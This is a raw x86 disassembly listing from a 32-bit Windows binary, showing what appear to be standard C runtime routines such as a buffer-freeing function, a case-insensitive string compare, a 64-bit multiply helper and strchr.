  409b93:	8b ff                	mov    %edi,%edi
  409b95:	55                   	push   %ebp
  409b96:	8b ec                	mov    %esp,%ebp
  409b98:	56                   	push   %esi
  409b99:	8b 75 08             	mov    0x8(%ebp),%esi
  409b9c:	8b 46 0c             	mov    0xc(%esi),%eax
  409b9f:	a8 83                	test   $0x83,%al
  409ba1:	74 1e                	je     0x409bc1
  409ba3:	a8 08                	test   $0x8,%al
  409ba5:	74 1a                	je     0x409bc1
  409ba7:	ff 76 08             	push   0x8(%esi)
  409baa:	e8 3c ac ff ff       	call   0x4047eb
  409baf:	81 66 0c f7 fb ff ff 	andl   $0xfffffbf7,0xc(%esi)
  409bb6:	33 c0                	xor    %eax,%eax
  409bb8:	59                   	pop    %ecx
  409bb9:	89 06                	mov    %eax,(%esi)
  409bbb:	89 46 08             	mov    %eax,0x8(%esi)
  409bbe:	89 46 04             	mov    %eax,0x4(%esi)
  409bc1:	5e                   	pop    %esi
  409bc2:	5d                   	pop    %ebp
  409bc3:	c3                   	ret
  409bc4:	cc                   	int3
  409bc5:	cc                   	int3
  409bc6:	cc                   	int3
  409bc7:	cc                   	int3
  409bc8:	cc                   	int3
  409bc9:	cc                   	int3
  409bca:	cc                   	int3
  409bcb:	cc                   	int3
  409bcc:	cc                   	int3
  409bcd:	cc                   	int3
  409bce:	cc                   	int3
  409bcf:	cc                   	int3
  409bd0:	55                   	push   %ebp
  409bd1:	8b ec                	mov    %esp,%ebp
  409bd3:	57                   	push   %edi
  409bd4:	56                   	push   %esi
  409bd5:	53                   	push   %ebx
  409bd6:	8b 4d 10             	mov    0x10(%ebp),%ecx
  409bd9:	0b c9                	or     %ecx,%ecx
  409bdb:	74 4d                	je     0x409c2a
  409bdd:	8b 75 08             	mov    0x8(%ebp),%esi
  409be0:	8b 7d 0c             	mov    0xc(%ebp),%edi
  409be3:	b7 41                	mov    $0x41,%bh
  409be5:	b3 5a                	mov    $0x5a,%bl
  409be7:	b6 20                	mov    $0x20,%dh
  409be9:	8d 49 00             	lea    0x0(%ecx),%ecx
  409bec:	8a 26                	mov    (%esi),%ah
  409bee:	0a e4                	or     %ah,%ah
  409bf0:	8a 07                	mov    (%edi),%al
  409bf2:	74 27                	je     0x409c1b
  409bf4:	0a c0                	or     %al,%al
  409bf6:	74 23                	je     0x409c1b
  409bf8:	83 c6 01             	add    $0x1,%esi
  409bfb:	83 c7 01             	add    $0x1,%edi
  409bfe:	3a e7                	cmp    %bh,%ah
  409c00:	72 06                	jb     0x409c08
  409c02:	3a e3                	cmp    %bl,%ah
  409c04:	77 02                	ja     0x409c08
  409c06:	02 e6                	add    %dh,%ah
  409c08:	3a c7                	cmp    %bh,%al
  409c0a:	72 06                	jb     0x409c12
  409c0c:	3a c3                	cmp    %bl,%al
  409c0e:	77 02                	ja     0x409c12
  409c10:	02 c6                	add    %dh,%al
  409c12:	3a e0                	cmp    %al,%ah
  409c14:	75 0b                	jne    0x409c21
  409c16:	83 e9 01             	sub    $0x1,%ecx
  409c19:	75 d1                	jne    0x409bec
  409c1b:	33 c9                	xor    %ecx,%ecx
  409c1d:	3a e0                	cmp    %al,%ah
  409c1f:	74 09                	je     0x409c2a
  409c21:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  409c26:	72 02                	jb     0x409c2a
  409c28:	f7 d9                	neg    %ecx
  409c2a:	8b c1                	mov    %ecx,%eax
  409c2c:	5b                   	pop    %ebx
  409c2d:	5e                   	pop    %esi
  409c2e:	5f                   	pop    %edi
  409c2f:	c9                   	leave
  409c30:	c3                   	ret
  409c31:	cc                   	int3
  409c32:	cc                   	int3
  409c33:	cc                   	int3
  409c34:	cc                   	int3
  409c35:	cc                   	int3
  409c36:	cc                   	int3
  409c37:	cc                   	int3
  409c38:	cc                   	int3
  409c39:	cc                   	int3
  409c3a:	cc                   	int3
  409c3b:	cc                   	int3
  409c3c:	cc                   	int3
  409c3d:	cc                   	int3
  409c3e:	cc                   	int3
  409c3f:	cc                   	int3
  409c40:	8b 44 24 08          	mov    0x8(%esp),%eax
  409c44:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  409c48:	0b c8                	or     %eax,%ecx
  409c4a:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  409c4e:	75 09                	jne    0x409c59
  409c50:	8b 44 24 04          	mov    0x4(%esp),%eax
  409c54:	f7 e1                	mul    %ecx
  409c56:	c2 10 00             	ret    $0x10
  409c59:	53                   	push   %ebx
  409c5a:	f7 e1                	mul    %ecx
  409c5c:	8b d8                	mov    %eax,%ebx
  409c5e:	8b 44 24 08          	mov    0x8(%esp),%eax
  409c62:	f7 64 24 14          	mull   0x14(%esp)
  409c66:	03 d8                	add    %eax,%ebx
  409c68:	8b 44 24 08          	mov    0x8(%esp),%eax
  409c6c:	f7 e1                	mul    %ecx
  409c6e:	03 d3                	add    %ebx,%edx
  409c70:	5b                   	pop    %ebx
  409c71:	c2 10 00             	ret    $0x10
  409c74:	cc                   	int3
  409c75:	cc                   	int3
  409c76:	cc                   	int3
  409c77:	cc                   	int3
  409c78:	cc                   	int3
  409c79:	cc                   	int3
  409c7a:	cc                   	int3
  409c7b:	cc                   	int3
  409c7c:	cc                   	int3
  409c7d:	cc                   	int3
  409c7e:	cc                   	int3
  409c7f:	cc                   	int3
  409c80:	8d 42 ff             	lea    -0x1(%edx),%eax
  409c83:	5b                   	pop    %ebx
  409c84:	c3                   	ret
  409c85:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  409c8c:	8d 64 24 00          	lea    0x0(%esp),%esp
  409c90:	33 c0                	xor    %eax,%eax
  409c92:	8a 44 24 08          	mov    0x8(%esp),%al
  409c96:	53                   	push   %ebx
  409c97:	8b d8                	mov    %eax,%ebx
  409c99:	c1 e0 08             	shl    $0x8,%eax
  409c9c:	8b 54 24 08          	mov    0x8(%esp),%edx
  409ca0:	f7 c2 03 00 00 00    	test   $0x3,%edx
  409ca6:	74 15                	je     0x409cbd
  409ca8:	8a 0a                	mov    (%edx),%cl
  409caa:	83 c2 01             	add    $0x1,%edx
  409cad:	3a cb                	cmp    %bl,%cl
  409caf:	74 cf                	je     0x409c80
  409cb1:	84 c9                	test   %cl,%cl
  409cb3:	74 51                	je     0x409d06
  409cb5:	f7 c2 03 00 00 00    	test   $0x3,%edx
  409cbb:	75 eb                	jne    0x409ca8
  409cbd:	0b d8                	or     %eax,%ebx
  409cbf:	57                   	push   %edi
  409cc0:	8b c3                	mov    %ebx,%eax
  409cc2:	c1 e3 10             	shl    $0x10,%ebx
  409cc5:	56                   	push   %esi
  409cc6:	0b d8                	or     %eax,%ebx
  409cc8:	8b 0a                	mov    (%edx),%ecx
  409cca:	bf ff fe fe 7e       	mov    $0x7efefeff,%edi
  409ccf:	8b c1                	mov    %ecx,%eax
  409cd1:	8b f7                	mov    %edi,%esi
  409cd3:	33 cb                	xor    %ebx,%ecx
  409cd5:	03 f0                	add    %eax,%esi
  409cd7:	03 f9                	add    %ecx,%edi
  409cd9:	83 f1 ff             	xor    $0xffffffff,%ecx
  409cdc:	83 f0 ff             	xor    $0xffffffff,%eax
  409cdf:	33 cf                	xor    %edi,%ecx
  409ce1:	33 c6                	xor    %esi,%eax
  409ce3:	83 c2 04             	add    $0x4,%edx
  409ce6:	81 e1 00 01 01 81    	and    $0x81010100,%ecx
  409cec:	75 1c                	jne    0x409d0a
  409cee:	25 00 01 01 81       	and    $0x81010100,%eax
  409cf3:	74 d3                	je     0x409cc8
  409cf5:	25 00 01 01 01       	and    $0x1010100,%eax
  409cfa:	75 08                	jne    0x409d04
  409cfc:	81 e6 00 00 00 80    	and    $0x80000000,%esi
  409d02:	75 c4                	jne    0x409cc8
  409d04:	5e                   	pop    %esi
  409d05:	5f                   	pop    %edi
  409d06:	5b                   	pop    %ebx
  409d07:	33 c0                	xor    %eax,%eax
  409d09:	c3                   	ret
  409d0a:	8b 42 fc             	mov    -0x4(%edx),%eax
  409d0d:	3a c3                	cmp    %bl,%al
  409d0f:	74 36                	je     0x409d47
  409d11:	84 c0                	test   %al,%al
  409d13:	74 ef                	je     0x409d04
  409d15:	3a e3                	cmp    %bl,%ah
  409d17:	74 27                	je     0x409d40
  409d19:	84 e4                	test   %ah,%ah
  409d1b:	74 e7                	je     0x409d04
  409d1d:	c1 e8 10             	shr    $0x10,%eax
  409d20:	3a c3                	cmp    %bl,%al
  409d22:	74 15                	je     0x409d39
  409d24:	84 c0                	test   %al,%al
  409d26:	74 dc                	je     0x409d04
  409d28:	3a e3                	cmp    %bl,%ah
  409d2a:	74 06                	je     0x409d32
  409d2c:	84 e4                	test   %ah,%ah
  409d2e:	74 d4                	je     0x409d04
  409d30:	eb 96                	jmp    0x409cc8
  409d32:	5e                   	pop    %esi
  409d33:	5f                   	pop    %edi
  409d34:	8d 42 ff             	lea    -0x1(%edx),%eax
  409d37:	5b                   	pop    %ebx
  409d38:	c3                   	ret
  409d39:	8d 42 fe             	lea    -0x2(%edx),%eax
  409d3c:	5e                   	pop    %esi
  409d3d:	5f                   	pop    %edi
  409d3e:	5b                   	pop    %ebx
  409d3f:	c3                   	ret
  409d40:	8d 42 fd             	lea    -0x3(%edx),%eax
  409d43:	5e                   	pop    %esi
  409d44:	5f                   	pop    %edi
  409d45:	5b                   	pop    %ebx
  409d46:	c3                   	ret
  409d47:	8d 42 fc             	lea    -0x4(%edx),%eax
  409d4a:	5e                   	pop    %esi
  409d4b:	5f                   	pop    %edi
  409d4c:	5b                   	pop    %ebx
  409d4d:	c3                   	ret
  409d4e:	ff 25 10 a1 40 00    	jmp    *0x40a110
